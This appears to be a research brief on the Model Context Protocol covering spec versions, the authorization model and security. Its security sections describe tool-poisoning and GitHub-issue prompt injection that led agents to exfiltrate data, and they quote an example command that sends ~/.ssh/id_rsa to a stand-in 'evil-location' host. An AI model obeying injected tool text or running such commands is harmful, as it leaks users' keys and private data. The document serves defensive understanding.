# Model Context Protocol (MCP)

**What it is:** The open protocol (Anthropic-originated, now community-governed) standardizing how LLM applications connect to external tools, data, and prompts. JSON-RPC 2.0 wire format, explicitly modeled on LSP.
**Axis:** agent, enterprise, app-builder (Houston exposes apps to agents — this is the protocol that exposure most likely rides on).
**Depth:** deep.

## Spec status (checked 2026-07-17)

- **Current published spec: `2025-11-25`** — confirmed live at [modelcontextprotocol.io/specification/latest](https://modelcontextprotocol.io/specification/latest), which still resolves to the 2025-11-25 schema as of this check.
- **Release candidate: `2026-07-28`**, locked **2026-05-21**, final publication **2026-07-28**. Beta SDKs (Python, TypeScript, Go, C#) are out now for the RC. This is a ~10-week validation window baked into the SDK tier system — Tier 1 SDKs are expected to ship support inside that window.
- The project **dropped release-milestone roadmapping** for 2026 in favor of "priority areas" owned by Working Groups, with a formal contributor ladder delegating SEP review — the roadmap post's own framing: *"working-standards work rarely has [predictability]."*

## Architecture (unchanged across both versions)

JSON-RPC 2.0 messages between three roles, explicitly LSP-inspired:

- **Hosts** — LLM applications that initiate connections (e.g., Claude Desktop, an IDE).
- **Clients** — connectors living inside the host, one per server connection.
- **Servers** — processes exposing context and capabilities.

Capabilities split by direction:
- **Server → Client**: Resources (context/data), Prompts (templated workflows), Tools (model-invocable functions).
- **Client → Server**: Sampling (server-initiated LLM calls), Roots (URI/filesystem boundary declarations), Elicitation (server-initiated requests for more info from the user).

## What landed in 2025-11-25

| Change | Mechanism |
|---|---|
| AS discovery | OpenID Connect Discovery 1.0 added alongside RFC 8414 |
| Incremental scope consent | Step-up via `WWW-Authenticate: Bearer error="insufficient_scope", scope="..."` on 403 |
| Client registration | **Client ID Metadata Documents (CIMD)** promoted to recommended path |
| Tasks | Experimental primitive for long-running work |
| Icons, URL-mode elicitation, tool calling in sampling | New capability surface |
| Origin validation | Invalid `Origin` → HTTP 403 |
| Tool input errors | Returned as **Tool Execution Errors, not Protocol Errors** — the model sees the failure and can self-correct instead of the connection erroring out |
| Schema default | **JSON Schema 2020-12** |
| RFC 9728 alignment | Protected Resource Metadata required (see Authorization below) |
| SDK tiering | Formal support tiers across the official SDKs |

## What's coming in 2026-07-28 (RC, verified against the [MCP blog RC post](https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/))

### Stateless core

The headline change: **the `initialize`/`initialized` handshake and the `Mcp-Session-Id` header are removed.** Quoting the RC post: *"the protocol version, client info, and client capabilities that used to be exchanged once at connection time now travel in `_meta` on every request."* Trace context (`traceparent`, `tracestate`, `baggage`, W3C standard) rides the same `_meta` field.

A new **`server/discover`** method lets a client fetch server capabilities on demand, replacing the handshake's up-front exchange.

Operational payoff, stated directly: *"any MCP request can land on any server instance, and the sticky routing and shared session stores that horizontal deployments needed before are no longer required at the protocol layer."* Servers can run **behind a plain round-robin load balancer**, route on an `Mcp-Method` header, and clients can cache `tools/list` responses. The framing across MCP community commentary: **"a stateless protocol, stateful applications"** — state moves to explicit handles the client threads between calls, not a server-pinned session.

Session hijacking as an attack class **largely evaporates** with `Mcp-Session-Id` gone — there's no session identifier left to steal or bind.

### Extensions and Tasks

**Extensions become first-class governance**, not just a feature bucket: reverse-DNS identified, living in their own `ext-*` repos with delegated maintainers, versioned independently of the core spec. A new Extensions Track in the SEP process gives a path from experimental to official.

**MCP Apps**: server-rendered UI, delivered as HTML templates tools declare ahead of time so hosts can prefetch, cache, and security-review before anything executes — rendered in **sandboxed iframes**, communicating back over the same JSON-RPC base protocol, so *"every UI-initiated action goes through the same audit and consent path as a direct tool call."*

**Tasks** graduates from experimental core primitive to an official, redesigned-stateless extension: `tools/call` can return a task handle; the client drives it with `tasks/get`, `tasks/update`, `tasks/cancel`. Notably **`tasks/list` is removed** — "it can't be scoped safely without sessions." Anyone who built against the 2025-11-25 experimental Tasks API has a migration to do.

### Authorization hardening — six SEPs

Framed as closing gaps specific to *"MCP's single-client, many-server shape"*:

1. **`iss` validation** — clients must validate the `iss` parameter on authorization responses per RFC 9207, mitigating AS mix-up attacks.
2. **`application_type` declaration** during Dynamic Client Registration, so an AS doesn't default a desktop/CLI client to `web` type.
3. **Issuer binding** — registered credentials bind to the issuing AS's `issuer`; clients re-register if a resource migrates AS.
4. Refresh-token request guidance for OIDC-style servers.
5. Scope-accumulation clarification during step-up.
6. `.well-known` discovery suffix standardization.

The protocol-level payoff called out explicitly: **a token issued for Server A cannot be replayed against Server B** — enforced by audience/`resource` binding, not by trusting the client.

### Deprecation policy — new, and it costs something

A formal **Active → Deprecated → Removed** lifecycle, **minimum 12 months between deprecation and earliest possible removal**: *"The methods, types, and capability flags continue to work in this release and in every specification version published within a year of it."*

**First use of the policy deprecates Roots, Sampling, and Logging:**

| Deprecated | Stated replacement |
|---|---|
| Roots | Tool parameters, resource URIs, or server configuration |
| Sampling | Direct integration with LLM provider APIs |
| Logging | stderr (stdio transports) / OpenTelemetry (structured observability) |

Sampling was a 2024–2025 headline capability (server-initiated LLM calls, "agentic" behavior baked into the protocol) — its deprecation is a real reversal, not spring cleaning. Read as: the spec authors concluded servers calling back into the model belonged at the application layer, not the protocol layer.

## Authorization model (from the current 2025-11-25 spec text — verbatim where it matters)

**Roles**: *"A protected MCP server acts as an OAuth 2.1 resource server... An MCP client acts as an OAuth 2.1 client... The implementation details of the authorization server are beyond the scope of this specification."* The AS may be co-hosted with the resource server or fully separate.

**Optionality and transport**: Authorization is **OPTIONAL**. *"Implementations using an HTTP-based transport SHOULD conform... Implementations using an STDIO transport SHOULD NOT follow this specification, and instead retrieve credentials from the environment."*

**Discovery — the 401 flow**: server returns `401` with `WWW-Authenticate: Bearer resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource", scope="files:read"`. MCP servers **MUST** implement RFC 9728 Protected Resource Metadata, and the document **MUST** include `authorization_servers`. Servers **MUST** provide RFC 8414 metadata and/or OIDC Discovery 1.0; clients **MUST** support both.

**Client registration — the priority order, and DCR's demotion**:

1. **Pre-registration** — existing client/server relationship.
2. **Client ID Metadata Documents (CIMD)** — used *"if the Authorization Server indicates it supports it"* via `client_id_metadata_document_supported: true`.
3. **Dynamic Client Registration (RFC 7591)** as fallback — the spec is explicit: *"This option is included for backwards compatibility with earlier versions of the MCP authorization spec."* DCR was the 2025 story; it is now third in line.
4. Prompt the user.

**CIMD mechanics**: `client_id` is an HTTPS URL with a path (`https://app.example.com/oauth/client-metadata.json`), pointing at a JSON document with at minimum `client_id`, `client_name`, `redirect_uris`. The AS **MUST** validate the fetched document's `client_id` matches the URL exactly, **MUST** validate redirect URIs against the document, **SHOULD** cache per HTTP headers. It solves MCP's defining problem, stated plainly in the spec's own framing: servers and clients with **no pre-existing relationship**.

**CIMD's spec-acknowledged risks**:
- **SSRF** — the AS fetches an attacker-supplied URL, "such as requests to private administration endpoints the authorization server has access to."
- **Localhost impersonation CIMD cannot prevent**: attacker supplies the *legitimate* client's metadata URL as `client_id`, binds any localhost port, provides that as `redirect_uri`. *"The server will see the legitimate client's metadata document and the user will see the legitimate client's name, making attack detection difficult."* Mitigation is UI-only: AS **MUST** clearly display the redirect URI hostname, **SHOULD** warn extra hard on localhost-only redirects.

**Hard requirements**:
- RFC 8707 `resource` parameter **MUST** be in both authorization and token requests, **MUST** be the canonical URI (no fragment, no trailing slash preference), **MUST** be sent "regardless of whether authorization servers support it."
- PKCE **MUST**, `S256` **MUST** when technically capable. If `code_challenge_methods_supported` is absent from AS metadata — including OIDC providers, where the field isn't formally part of OpenID Provider Metadata but is commonly included anyway — clients **MUST refuse to proceed**.
- Audience validation **MUST**: *"MCP servers MUST only accept tokens that are valid for use with their own resources... MUST NOT accept or transit any other tokens."*
- Bearer header on every request (*"even if they are part of the same logical session"*), **never in query strings**.
- Error codes: 401 unauthorized, **403 insufficient scope**, 400 malformed.

**Step-up**: 403 + `WWW-Authenticate: Bearer error="insufficient_scope", scope="files:read files:write"`. `scopes_supported` is defined as *"the minimal set of scopes necessary for basic functionality,"* with the rest requested incrementally.

## Security — tool poisoning

**Coined by Invariant Labs**, disclosed **April 6, 2025**, first demonstrated against a WhatsApp MCP server: a poisoned tool description on a secondary server instructed the LLM to exfiltrate the user's entire WhatsApp message history through a seemingly benign tool call. Repro at [github.com/invariantlabs-ai/mcp-injection-experiments](https://github.com/invariantlabs-ai/mcp-injection-experiments).

The mechanism: adversarial instructions embedded **inside tool descriptions** — text the model reads and treats as ground truth during registration, but that is **not normally shown to the user**. This is the "approval-view fidelity gap": users approve what the UI shows them (usually a tool name and one-line summary); the model acts on the full description text, which can carry hidden instructions the approval surface never rendered.

Now catalogued as **OWASP MCP03:2025 (Tool Poisoning)**. Benchmarks: **MCPTox** (arXiv 2508.14925) and **MCPSecBench** (arXiv 2508.13220) quantify exposure across real servers — one cited figure: **5.5% of public servers** contain tool-poisoning vulnerabilities, with the first malicious MCP package spotted in the wild September 2025. A 2026 paper (arXiv 2607.05744) documents **Unicode TAG-block concealment** across three server implementations — the payload is invisible even if a reviewer *does* render the description text.

**The spec concedes this at the trust level, not the mechanism level.** Direct quotes from the current spec: descriptions and annotations *"should be considered untrusted, unless obtained from a trusted server,"* and, unambiguously: **"While MCP itself cannot enforce these security principles at the protocol level, implementors SHOULD..."** — followed by a list of application-layer mitigations (consent UIs, documentation, access controls). There is no protocol-level fix in either 2025-11-25 or the 2026-07-28 RC.

**The GitHub MCP attack** (widely reported, third-party disclosure): a crafted GitHub issue hijacked an assistant with repo access into exfiltrating **private repository data via a public pull request**. This is a **confused deputy through an entirely legitimate data channel** — nothing was compromised in the classical sense; every component (the issue-reading tool, the PR-creation tool, the model) behaved exactly as designed. The vulnerability was in the trust boundary between "content the agent reads" and "instructions the agent follows," not in any single component.

## Security — confused deputy (the spec's canonical treatment)

The spec lays out a precise four-precondition attack, worth recording because it's a general pattern for any OAuth proxy, not MCP-specific:

**Preconditions** (all four required): (1) a proxy uses a **static client ID** with a third-party AS; (2) the proxy allows **dynamic registration** of clients against itself; (3) the third-party AS sets a **consent cookie** after first approval; (4) the proxy **lacks per-client consent** before forwarding to the third-party AS.

**Attack**: a legitimate user authorizes once, setting the third-party AS's consent cookie scoped to the proxy's static `client_id`. An attacker dynamically registers a new client against the proxy with `redirect_uri: attacker.com`, sends the victim a crafted authorization link. Because the cookie is present and scoped to the (shared, static) client ID, the third-party AS **skips the consent screen** — the resulting code redirects to `attacker.com`.

**Mitigations enumerated in the spec**: a per-client consent registry checked before forwarding; an MCP-owned consent page with CSRF protection and `frame-ancestors` / `X-Frame-Options: DENY`; consent cookies using the `__Host-` prefix, `Secure`/`HttpOnly`/`SameSite=Lax`, signed, and — the detail worth keeping — **bound to a specific `client_id`, not to "this user has consented" in general**; exact-string redirect URI matching; and the subtlest one: **the `state` cookie must not be set until *after* consent approval**, otherwise, in the spec's words, "the consent screen is rendered ineffective."

**Token passthrough is explicitly forbidden.** The rule, verbatim: *"MCP servers MUST NOT accept any tokens that were not explicitly issued for the MCP server."* If the server calls an upstream API, that's a **separate token**, obtained as an OAuth client of the upstream AS — *"The MCP server MUST NOT pass through the token it received from the MCP client."* Risks the spec enumerates for why: security-control circumvention (bypasses rate limiting/validation/monitoring keyed on audience), **audit destruction** (*"a malicious actor in possession of a stolen token can use the server as a proxy for data exfiltration"*), trust-boundary breakage, and future compatibility risk if the upstream API changes its token format.

## Security — other spec'd attacks

- **SSRF via OAuth discovery**: a malicious `resource_metadata`, `authorization_servers`, or `token_endpoint` value can redirect the AS's own outbound fetch to `http://169.254.169.254/` (cloud instance metadata → IAM credential theft), `http://localhost:6379/` (internal services), or exploit DNS-rebinding TOCTOU. Mitigations: HTTPS-only, block RFC 1918 + loopback + link-local ranges (`10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`, plus IPv6 equivalents `fc00::/7`, `fe80::/10`), validate every redirect hop, use an **egress proxy** (Stripe's **Smokescreen** named as reference implementation), pin DNS resolution. The spec's own caution: **"Avoid implementing IP validation manually. Attackers exploit encoding tricks (octal, hex, IPv4-mapped IPv6) that custom parsers often miss."**
- **Session hijacking** (2025-11-25 spec, largely moot once `Mcp-Session-Id` is removed in 2026-07-28): *"MCP Servers MUST NOT use sessions for authentication."* CSPRNG session IDs; bind sessions to identity via `<user_id>:<session_id>` where the user ID derives from the validated token, never from client-supplied input.
- **Local server compromise**: the spec's own illustrative example of a malicious `npx` install: `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`. One-click server-install configs **MUST** show the exact, untruncated command before execution.
- **OAuth URL validation**: a `javascript:` URL passed through `window.open()` is an XSS vector; unescaped shell metacharacters in a URL passed to a local process are an RCE vector. **MUST** allowlist `http`/`https` schemes only.
- **Scope minimization failure modes** the spec names explicitly: blast radius, revocation friction, audit noise, privilege chaining, **consent abandonment** (too many scopes requested up front, user bails), **scope inflation blindness** (nobody notices scope creep over time). The named anti-pattern: **"treating claimed scopes in token as sufficient without server-side authorization logic"** — i.e., trusting the JWT's scope claim instead of checking it against what the specific operation actually requires.

## OpenAPI → MCP: the generation problem

Verified against **[Speakeasy's "lessons from 50+ production MCP servers" post](https://www.speakeasy.com/blog/generating-mcp-from-openapi-lessons-from-50-production-servers)**.

**1:1 endpoint→tool mapping fails at scale.** A 200-endpoint OpenAPI document naively converts to 200 tools; Speakeasy's framing: *"When faced with 200 tools, the model becomes confused as its context window is overwhelmed."* Their fix is a **three-layer approach**: prune the OpenAPI document before generation (drop health checks and anything off-task, via custom extensions), build format intelligence into the generator (base64 images, buffer streams, flattening response envelopes), and provide a customization/overlay layer for renaming and consolidating.

OpenAPI descriptions are written **for humans reading one endpoint at a time in a browser**; an MCP client loads **every tool description into context simultaneously**, so verbosity directly displaces prompt budget. Three endpoints all described "Get user info" are indistinguishable to a model choosing between them — human-readable ≠ model-disambiguable.

**The synthesis worth keeping**: an OpenAPI spec encodes *what the API can do*; a good MCP toolset encodes *what an agent should do*. The mapping from one to the other is lossy in the useful direction — curation, renaming, and consolidation, not transcription. **Scopes defined pre-generation** (server-side, baked into the tool's declared permissions) beat client-side toggles the model can't be trusted to respect.

**Tools in this space**: **Speakeasy** (TypeScript SDK + MCP server generator, self-hosted, the 50+ production servers referenced above), **Gram** (Speakeasy's managed hosting + toolset curation layer), **FastMCP** (Python; since v2.0.0 converts both OpenAPI specs *and* live FastAPI apps directly), **Stainless** (ships MCP generation as a separate npm package specifically to keep bundle size down), **openapi-mcp-generator** (community tool).

## Code execution with MCP (Anthropic engineering)

From **[Anthropic's "Code execution with MCP" post](https://www.anthropic.com/engineering/code-execution-with-mcp)**: instead of loading every tool definition into context and having the model call tools directly, present MCP servers as a **filesystem of code modules** the agent imports and calls from a script it writes and executes. The model composes calls in code; intermediate results (e.g., a 10,000-row query result) stay in the execution environment and never enter the context window — *"the agent sees five rows instead of 10,000."*

**Reported result**: a Google Drive → Salesforce workflow went from **~150,000 tokens to ~2,000 tokens — a 98.7% reduction** — by restructuring the same task as code-executed MCP calls instead of direct tool-calling with full intermediate results passed through context. (Vendor-reported, single benchmark task, not independently reproduced here.)

**Anthropic's own caveat, quoted directly**: *"Running agent-generated code requires a secure execution environment with appropriate sandboxing, resource limits, and monitoring."* This trades a context-window problem for a sandboxing problem — the tradeoff is real, not free.

**Cloudflare Code Mode** is described in the wild as the same underlying idea (tools-as-code rather than tools-as-schema), applied to Cloudflare's Workers/agents stack — not independently verified in depth here.

## Facts & figures

- Current spec: `2025-11-25` (verified live 2026-07-17). RC `2026-07-28` locked 2026-05-21, final 2026-07-28.
- Deprecation window: **minimum 12 months** between deprecation and earliest removal.
- Tool poisoning: coined by Invariant Labs, disclosed **April 6, 2025**. First malicious MCP package in the wild: **September 2025**. **5.5%** of public servers reportedly carry tool-poisoning vulnerabilities (source benchmark, vendor/research-reported).
- Code execution with MCP: **150,000 → 2,000 tokens (98.7% reduction)** on one Anthropic-reported Drive→Salesforce task.
- Speakeasy: 50+ production MCP servers generated as of their post.

## Sources

- [Specification (latest / 2025-11-25)](https://modelcontextprotocol.io/specification/latest) · [Authorization](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization) · [Security Best Practices](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices)
- [The 2026-07-28 MCP Specification Release Candidate](https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/) · [Beta SDKs for 2026-07-28](https://blog.modelcontextprotocol.io/posts/sdk-betas-2026-07-28/) · [The 2026 MCP Roadmap](https://blog.modelcontextprotocol.io/posts/2026-mcp-roadmap/)
- [OWASP MCP03:2025 – Tool Poisoning](https://owasp.org/www-project-mcp-top-10/2025/MCP03-2025%E2%80%93Tool-Poisoning)
- [Invariant Labs MCP injection experiments (GitHub)](https://github.com/invariantlabs-ai/mcp-injection-experiments)
- MCPTox (arXiv [2508.14925](https://arxiv.org/pdf/2508.14925)) · MCPSecBench (arXiv 2508.13220) · Unicode TAG-block concealment paper (arXiv 2607.05744) — **not independently re-verified beyond abstract/search-result level.**
- [Speakeasy: Generating MCP servers from OpenAPI — lessons from 50 production servers](https://www.speakeasy.com/blog/generating-mcp-from-openapi-lessons-from-50-production-servers)
- [Anthropic: Code execution with MCP](https://www.anthropic.com/engineering/code-execution-with-mcp)
- **Not directly verified / vendor-reported:** the 150k→2k token figure is Anthropic's own single-task benchmark; the 5.5%-of-servers figure traces to a research benchmark paper, not independently re-run; Cloudflare Code Mode's mechanism is stated by community sources, not fetched directly from Cloudflare docs in this pass.
